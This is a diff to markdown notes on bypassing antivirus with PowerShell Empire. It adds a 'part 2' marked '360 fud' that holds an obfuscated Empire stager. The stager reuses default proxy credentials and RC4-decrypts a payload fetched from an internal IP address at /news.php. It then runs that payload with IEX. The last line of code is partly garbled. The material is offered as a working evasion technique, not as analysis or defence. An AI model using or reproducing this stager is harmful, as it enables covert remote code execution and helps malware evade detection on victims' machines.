@@ -1,4 +1,4 @@
-## ByPassAV EmpirePowerShell
+## ByPassAV EmpirePowerShell part 1
 
 
 ```markdown
@@ -139,4 +139,13 @@ compile:
 
 For more details see [video](https://www.youtube.com/watch?v=0jaC8156BEE)
 
-## ByPassAV to be continued...
+## ByPassAV EmpirePowerShell part 2
+
+360 fud
+
+```markdown
+
+"[SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;$WC=NEW-OBjECT SYstem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)
+like Gecko';$WC.HeAdErS.Add('User-Agent',$u);$WC.PRoxY= [SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;$WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;$Script:Proxy = $wc.Proxy;$K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');$R= {$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J-(-$S[$_])- (-$K[$_%$K.CoUnt]))%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H= ($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_- bXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://172.16.3.77:80';$t='/news.php';$Wc.HEaDERs.AD joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"
+
+```
